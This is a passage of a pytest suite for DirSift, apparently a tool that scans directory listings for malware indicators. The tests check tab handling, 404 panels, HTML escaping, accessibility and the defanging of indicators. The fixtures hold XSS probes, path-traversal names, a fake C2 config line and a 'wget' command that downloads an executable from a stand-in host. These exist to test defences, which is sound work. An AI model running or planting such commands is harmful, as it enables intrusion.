    assert strip.group(1).count("<li") == 3
    assert page.count('class="driver-badge"') == 5


def test_the_indicators_and_their_networks_live_on_their_own_tab(tmp_path: Path):
    name = run_with_networks(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    indicators = panel_of(page, "indicators")
    assert "198[.]51[.]100[.]77" in indicators
    assert "TEST-NET-HOSTING" in indicators
    assert "ip2asn-combined.tsv" in indicators


def test_notes_and_families_live_on_their_own_tabs(tmp_path: Path):
    client = TestClient(create_app(tmp_path))
    notes = panel_of(client.get(f"/runs/{run_with_errors(tmp_path)}").text, "notes")
    assert "<details" in notes
    assert "what this means" in notes
    families = panel_of(client.get(f"/runs/{run_with_a_family(tmp_path)}").text, "families")
    assert "svc{n}.exe" in families


def test_an_empty_tab_says_so_in_one_sentence(tmp_path: Path):
    empty = ScanResult(root_url="http://127.0.0.1:8080/", listing_flavor="python")
    name = save_run(tmp_path, empty)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    for tab in ("indicators", "families", "notes"):
        assert 'class="empty"' in panel_of(page, tab), tab


def test_a_tab_the_page_does_not_have_is_never_echoed_back(tmp_path: Path):
    """?tab= is only compared against the known parts; whatever else arrives is
    dropped, never written into the page, and the page lands nowhere."""
    name = run_with_errors(tmp_path)
    client = TestClient(create_app(tmp_path))
    hostile = '"><script>alert(1)</script>'
    for asked in (hostile, "NOTES", "notes ", "files#notes", "../notes"):
        response = client.get(f"/runs/{name}", params={"tab": asked})
        assert response.status_code == 200, asked
        assert landing(response.text) == [], asked
    page = client.get(f"/runs/{name}", params={"tab": hostile}).text
    assert "<script>alert(1)" not in page
    assert "alert(1)" not in page


def test_a_repeated_tab_lands_on_one_part_at_most(tmp_path: Path):
    name = run_with_errors(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}?tab=notes&tab=families").text
    landed = landing(page)
    assert len(landed) <= 1
    assert set(landed) <= {"notes", "families"}


def test_the_server_and_the_page_agree_on_the_tabs():
    """The tab names the server accepts are the tab names the template draws."""
    from dirsift.web import RUN_TABS as served

    assert served == RUN_TABS

# A file that is not in the run

GONE = "http://127.0.0.1:8080/gone.exe"


def missing_heading(panel: str) -> re.Match[str] | None:
    return re.search(r'<h2[^>]*class="preview-name"[^>]*>(.*?)</h2>', panel, re.S)


def test_a_file_not_in_the_run_gets_a_panel_that_says_so(tmp_path: Path):
    """The preview lands in a sheet on a narrow screen, so the miss has to read
    like a panel: a heading focus can land on, the address it looked for, and a
    way back. It stays a 404."""
    name = run_with_a_family(tmp_path)
    response = TestClient(create_app(tmp_path)).get(f"/runs/{name}/file", params={"url": GONE})
    assert response.status_code == 404
    panel = response.text
    assert 'class="preview"' in panel
    heading = missing_heading(panel)
    assert heading, "the miss has no heading"
    assert 'tabindex="-1"' in heading.group(0)
    assert "Not in this run" in heading.group(1)
    assert "hxxp://127[.]0[.]0[.]1:8080/gone[.]exe" in panel
    assert "http://127.0.0.1:8080/gone.exe" not in panel  # targets are defanged
    assert re.search(rf'<a[^>]*href="/runs/{name}"', panel)


def test_the_missing_panel_escapes_the_address_it_quotes(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    hostile = "http://127.0.0.1:8080/<script>alert(1)</script>"
    panel = TestClient(create_app(tmp_path)).get(
        f"/runs/{name}/file", params={"url": hostile}
    ).text
    assert "<script>" not in panel
    assert "&lt;script&gt;" in panel


def test_every_panel_route_answers_a_miss_the_same_way(tmp_path: Path):
    """The verdict and the comparison land in the same preview, so they miss the
    same way the preview does."""
    name = run_with_a_family(tmp_path)
    client = TestClient(create_app(tmp_path))
    misses = (
        client.post(f"/runs/{name}/verdict", params={"url": GONE}),
        client.get(
            f"/runs/{name}/diff",
            params={"a": "http://127.0.0.1:8080/install.bat", "b": GONE},
        ),
    )
    for response in misses:
        assert response.status_code == 404
        heading = missing_heading(response.text)
        assert heading and "Not in this run" in heading.group(1)
        assert "hxxp://127[.]0[.]0[.]1:8080/gone[.]exe" in response.text


def test_a_miss_never_asks_the_scanner(tmp_path: Path):
    asked = []
    name = run_with_a_family(tmp_path)
    app = create_app(tmp_path, lookup=lambda digest, api_key=None: asked.append(digest))
    TestClient(app).post(f"/runs/{name}/verdict", params={"url": GONE})
    assert asked == []

# Driver scores come from the server, not from the strip


def test_every_scored_driver_gets_its_badge_not_only_the_first_six(tmp_path: Path):
    """The strip shows three; the badges in the listing are not held to the
    strip's short list. Eight scripts that call each other all carry one."""
    names = [f"stage{n}.bat" for n in range(1, 9)]
    entries = [
        Entry(
            url=f"http://127.0.0.1:8080/{own}",
            name=own,
            depth=1,
            kind="script",
            fetched_bytes=80,
            text_preview="\n".join(f"call {other}" for other in names if other != own),
        )
        for own in names
    ]
    name = save_run(tmp_path, ScanResult(root_url="http://127.0.0.1:8080/", entries=entries))
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    assert page.count('class="driver-badge"') == 8
    strip = re.search(r"<ol[^>]*data-drivers[^>]*>(.*?)</ol>", page, re.S)
    assert strip and strip.group(1).count("<li") == 3


def test_a_badge_and_the_strip_show_the_same_rounded_score(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    strip = re.search(r"<ol[^>]*data-drivers[^>]*>(.*?)</ol>", page, re.S)
    assert strip
    in_strip = re.search(r'class="driver-score">.*?</span>\s*(\d+)\s*</span>', strip.group(1), re.S)
    row = inventory_row(page, "install.bat")
    assert row
    badge = re.search(r'class="driver-badge">.*?</span>\s*(\d+)\s*</span>', row.group(0), re.S)
    assert in_strip and badge
    assert in_strip.group(1) == badge.group(1)


# Templated error and "gone" pages (N1)
#
# Five return points used to answer with a bare body (a lone <h1>, or the single
# word "gone") that failed axe on document-title, html-has-lang and the main
# landmark. They now draw through base.html (the full pages) or land in a panel
# the live page already knows how to show (the htmx fragments). These check the
# wiring: the status code, which shape comes back, and the structure axe cared
# about.


def structural_error_page(html: str) -> None:
    """What every full-page error inherits from base.html."""
    assert '<html lang="en">' in html
    assert "<main" in html
    assert html.count("<h1") == 1
    assert BACK_TO_DASHBOARD.search(html)


def test_a_job_that_is_not_tracked_is_a_templated_full_page(tmp_path: Path):
    """E1. A direct visit to a job the store never had, or lost on a restart."""
    response = TestClient(create_app(tmp_path)).get("/jobs/does-not-exist")
    assert response.status_code == 404
    html = response.text
    structural_error_page(html)
    assert "<title>scan not found</title>" in html
    assert "This scan is no longer tracked." in html
    assert "no such job" not in html  # the bare page is gone


def test_a_gone_job_status_stops_polling_and_points_at_the_dashboard(tmp_path: Path):
    """E2. The polling box asks after the job is gone: a sentence, a link, and no
    trigger, so the swap ends the polling instead of scheduling the next ask."""
    response = TestClient(create_app(tmp_path)).get("/jobs/does-not-exist/status")
    assert response.status_code == 404
    body = response.text
    assert "This scan is no longer tracked." in body
    assert 'href="/"' in body
    assert "hx-get" not in body  # no next poll is scheduled
    assert "hx-trigger" not in body
    assert body.strip() != "gone"  # the single word is gone
    assert "<html" not in body  # a fragment, not a page


def test_a_run_visited_directly_that_is_not_there_is_a_templated_full_page(tmp_path: Path):
    """E3. No htmx header means the browser navigated to the run page itself."""
    response = TestClient(create_app(tmp_path)).get("/runs/not-a-real-run")
    assert response.status_code == 404
    html = response.text
    structural_error_page(html)
    assert "<title>run not found</title>" in html
    assert "No run by that name." in html
    assert "no such run" not in html  # the bare page is gone


def test_the_no_such_run_page_never_echoes_the_name(tmp_path: Path):
    """A name that is not even a run name reaches the same page, and the hostile
    value is never written into it (the body is fixed text)."""
    client = TestClient(create_app(tmp_path))
    for name in ("..%5Csecret-run", "%2E%2E%2Fsecret-run", "secret-run"):
        response = client.get(f"/runs/{name}")
        assert response.status_code == 404
        assert "secret-run" not in response.text


def test_a_run_gone_over_htmx_lands_in_a_preview_panel(tmp_path: Path):
    """E4. A preview, a verdict or a compare fetched for a run that is not on disk
    gets the preview-shaped panel (a sheet on a narrow screen), still a 404."""
    client = TestClient(create_app(tmp_path))
    hx = {"HX-Request": "true"}
    calls = (
        client.get("/runs/ghost/file", params={"url": "http://127.0.0.1:8080/x"}, headers=hx),
        client.post("/runs/ghost/verdict", params={"url": "http://127.0.0.1:8080/x"}, headers=hx),
        client.get(
            "/runs/ghost/diff",
            params={"a": "http://127.0.0.1:8080/x", "b": "http://127.0.0.1:8080/y"},
            headers=hx,
        ),
    )
    for response in calls:
        assert response.status_code == 404
        panel = response.text
        assert 'class="preview"' in panel
        assert re.search(r'<h2[^>]*class="preview-name"[^>]*>', panel)
        assert "Run not found" in panel
        assert 'href="/"' in panel
        assert "<html" not in panel  # a fragment, not a page


def test_the_same_missing_run_is_a_full_page_without_the_htmx_header(tmp_path: Path):
    """E3 vs E4. The header is the only difference: panel over htmx, page without."""
    client = TestClient(create_app(tmp_path))
    params = {"url": "http://127.0.0.1:8080/x"}
    over_htmx = client.get("/runs/ghost/file", params=params, headers={"HX-Request": "true"})
    direct = client.get("/runs/ghost/file", params=params)
    assert over_htmx.status_code == direct.status_code == 404
    assert "preview-name" in over_htmx.text
    assert "<html" not in over_htmx.text
    structural_error_page(direct.text)
    assert "No run by that name." in direct.text


def test_a_refusal_is_a_templated_full_page_that_keeps_the_quote_escaped(tmp_path: Path):
    """E5. The handler is kept for defence even though a scope error is caught in
    the scan thread today, so this exercises it through a planted route."""
    from dirsift.fetcher import ScopeError

    app = create_app(tmp_path)

    @app.get("/refuse")
    def refuse():
        raise ScopeError("out of scope: http://x.test/<script>alert(1)</script>")

    response = TestClient(app).get("/refuse")
    assert response.status_code == 400
    html = response.text
    structural_error_page(html)
    assert "<title>refused</title>" in html
    assert "That link was out of scope." in html
    # The quoted address is escaped exactly once: the markup is shown, not run,
    # and not turned into doubly-escaped entities.
    assert "<script>alert(1)</script>" not in html
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in html
    assert "&amp;lt;" not in html  # no double escape


# The scan page keeps its live region through the swap (E6)


def start_a_failing_scan(client: TestClient) -> str:
    """A scan of a loopback address fails fast; the job page is the return value."""
    started = client.post(
        "/scan", data={"url": "http://127.0.0.1:9/"}, follow_redirects=False
    )
    return started.headers["location"]


def test_the_scan_page_keeps_the_live_region_outside_the_polling_element(tmp_path: Path):
    """E6. The aria-live wrapper must not be the element that swaps, or the live
    region leaves the DOM on the first poll and the later state is not announced."""
    client = TestClient(create_app(tmp_path))
    html = client.get(start_a_failing_scan(client)).text
    wrapper = re.search(r'<div class="job-live"[^>]*>', html)
    assert wrapper, "the scan page has no job-live wrapper"
    assert 'aria-live="polite"' in wrapper.group(0)
    assert "hx-get" not in wrapper.group(0)  # the wrapper itself never polls
    inner = re.search(r'<div class="job-live"[^>]*>\s*(<div[^>]*>)', html, re.S)
    assert inner and "hx-get" in inner.group(1)  # the poll lives inside it


def test_a_finished_scan_status_does_not_schedule_another_poll(tmp_path: Path):
    """E6. The failed branch of the status fragment carries no trigger, so the
    polling stops once the scan is done (the same way the gone fragment does)."""
    client = TestClient(create_app(tmp_path))
    status_url = start_a_failing_scan(client) + "/status"
    deadline = time.monotonic() + 5
    body = client.get(status_url).text
    while "failed" not in body and time.monotonic() < deadline:
        time.sleep(0.05)
        body = client.get(status_url).text
    assert "failed" in body
    assert "hx-get" not in body
    assert "hx-trigger" not in body

# Keyboard hints sit where the keys work


def section_of(page: str, key: str) -> str:
    match = re.search(rf'<section[^>]*id="{key}"[^>]*>.*?(?=<section class="case-sec")', page, re.S)
    assert match, f"no {key} section on the page"
    return match.group(0)


def plain(html: str) -> str:
    return " ".join(re.sub(r"<[^>]+>", " ", html).split())


def test_the_top_bar_carries_no_keyboard_hint(tmp_path: Path):
    """j and k only work in the inventory and in the file dialog, so the bar
    that sits over the whole page does not advertise them."""
    name = run_with_a_family(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    top = header_of(page)
    assert "kbd" not in top
    assert "move the files" not in page


def test_the_inventory_says_which_keys_walk_it(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    inventory = section_of(page, "files")
    hint = re.search(r'<p[^>]*class="[^"]*\bkeys\b[^"]*"[^>]*>(.*?)</p>', inventory, re.S)
    assert hint, "the inventory has no keyboard hint"
    assert "js-only" in hint.group(0), "the keys only work with script on"
    assert plain(hint.group(1)) == "j and k for the next and previous file, Enter to open it."
    assert "<kbd>j</kbd>" in hint.group(1) and "<kbd>k</kbd>" in hint.group(1)
    assert "Press j" not in page  # the old hint under the list said it twice


def test_no_page_draws_a_key_as_a_button():
    """A key in running text is the mono face and nothing else: no box, no fill."""
    css = (STATIC / "dirsift.css").read_text(encoding="utf-8")
    assert ".kbd" not in css
    rule = re.search(r"(?m)^kbd\s*\{([^}]*)\}", css)
    assert rule, "no rule for kbd"
    body = rule.group(1)
    for prop in ("border", "background", "box-shadow", "padding"):
        assert not re.search(rf"(?m)^\s*{prop}[\w-]*\s*:", body), prop
    templates = Path(STATIC).parent / "templates"
    for template in templates.glob("*.html"):
        assert 'class="kbd"' not in template.read_text(encoding="utf-8"), template.name


# Context lines on the run page are defanged as they are drawn


def run_with_live_context(runs_dir: Path) -> str:
    """A config whose lines hold the shapes the context pass once left live:
    an e-mail, a bracketed IPv6, a host with a port and a path, a .co name."""
    source = "http://127.0.0.1:8080/cfg.txt"
    text = "\n".join(
        [
            "mail ops@evil-mail.co for the key",
            "bind [2001:db8:85a3::8a2e:370:7334]:443",
            "c2=panel.evil.co:8443/gate.php",
            "wget http://203.0.113.9:8080/drop/a.exe -O /tmp/a",
            "fallback 198.51.100.4 and updates.example.top",
        ]
    )
    entry = Entry(
        url=source,
        name="cfg.txt",
        depth=1,
        kind="config",
        confidence="sniffed",
        fetched_bytes=len(text),
        size=len(text),
        text_preview=text,
    )
    return save_run(
        runs_dir,
        ScanResult(root_url="http://127.0.0.1:8080/", listing_flavor="python", entries=[entry]),
    )


def test_a_context_line_shows_nothing_live(tmp_path: Path):
    from dirsift.analyze import analyze
    from dirsift.detections import live_values

    name = run_with_live_context(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    timeline = re.search(r'<ol class="timeline"[^>]*>(.*?)</ol>', page, re.S)
    assert timeline, "no indicator timeline"
    body = timeline.group(1)
    saved = ScanResult.model_validate_json((tmp_path / f"{name}.json").read_text("utf-8"))
    result, _ = analyze(saved)
    assert len(result.iocs) >= 5
    live = [value for value in live_values(result) if value in body]
    assert live == []
    assert 'class="tl-c data"' in body  # the context lines are still drawn


def test_every_class_the_run_page_leans_on_has_a_rule():
    """The section menu, the key hint and the include pills are styled, so a
    stylesheet edit that drops one of their rules fails here and not on screen."""
    css = (STATIC / "dirsift.css").read_text(encoding="utf-8")
    for selector in (".spy-band {", ".spy {", ".spy a", ".keys {", "kbd {", ".skip-link {"):
        assert selector in css, selector


# The mark in the tab and in the bar


def test_every_page_names_its_tab_icon(tmp_path: Path):
    client = TestClient(create_app(tmp_path))
    head = client.get("/").text.split("</head>", 1)[0]
    assert '<link rel="icon" href="/static/favicon.svg" type="image/svg+xml">' in head
    assert '<link rel="icon" href="/static/favicon-32.png" sizes="32x32" type="image/png">' in head
    icon = client.get("/static/favicon.svg")
    assert icon.status_code == 200
    assert icon.headers["content-type"].startswith("image/svg+xml")
    assert client.get("/static/favicon-32.png").status_code == 200


def test_the_logo_link_says_where_it_goes_and_hides_the_drawing(tmp_path: Path):
    header = header_of(TestClient(create_app(tmp_path)).get("/").text)
    brand = re.search(r'<a[^>]*class="brand"[^>]*>(.*?)</a>', header, re.S)
    assert brand, "no logo link"
    assert 'aria-label="DirSift dashboard"' in brand.group(0)
    svg = re.search(r"<svg[^>]*>", brand.group(1))
    assert svg and 'aria-hidden="true"' in svg.group(0)
    assert 'viewBox="0 0 16 16"' in svg.group(0)
    assert 'class="brand-band"' in brand.group(1)
    assert "DIRSIFT" in brand.group(1)
